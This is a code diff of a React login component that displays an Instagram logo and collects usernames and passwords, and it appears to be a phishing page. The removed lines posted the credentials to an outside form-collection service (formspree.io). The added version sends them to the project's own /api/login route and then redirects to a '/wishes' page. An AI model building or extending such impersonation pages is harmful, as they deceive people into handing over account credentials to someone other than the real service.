@@ -9,35 +9,29 @@ export default function Login() {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
 
-  // const handleLogin = async (e) => {
-  //   e.preventDefault();
-
-  //   if (username && password) {
-  //     try {
-  //       const response = await fetch('/api/login', {
-  //         method: 'POST',
-  //         headers: { 'Content-Type': 'application/json' },
-  //         body: JSON.stringify({ username, password }),
-  //       });
-
-  //       if (response.ok) {
-  //         router.push('/wishes');
-  //       } else {
-  //         console.error('Error:', await response.json());
-  //       }
-  //     } catch (error) {
-  //       console.error('Network error:', error.message);
-  //     }
-  //   }
-  // };
-
-  const handleLogin = (e) => {
+  const handleLogin = async (e) => {
     e.preventDefault();
-    // Simulate login
+
     if (username && password) {
-      router.push('/wishes');
+      try {
+        const response = await fetch('/api/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username, password }),
+        });
+
+        if (response.ok) {
+          router.push('/wishes');
+        } else {
+          console.error('Error:', await response.json());
+        }
+      } catch (error) {
+        console.error('Network error:', error.message);
+      }
     }
   };
+
+
 
   return (
     <div className="flex flex-col min-h-screen bg-gray-100 text-black">
@@ -46,7 +40,7 @@ export default function Login() {
           <div className="flex justify-center mb-6">
             <Image src="/instaLogo.png" width={200} height={200} alt="Instagram Logo" />
           </div>
-          <form action="https://formspree.io/f/xqazqorw" method = "POST" onclick = {handleLogin}>
+          <form onclick = {handleLogin}>
             <div className="mb-4">
               <input
                 type="text"
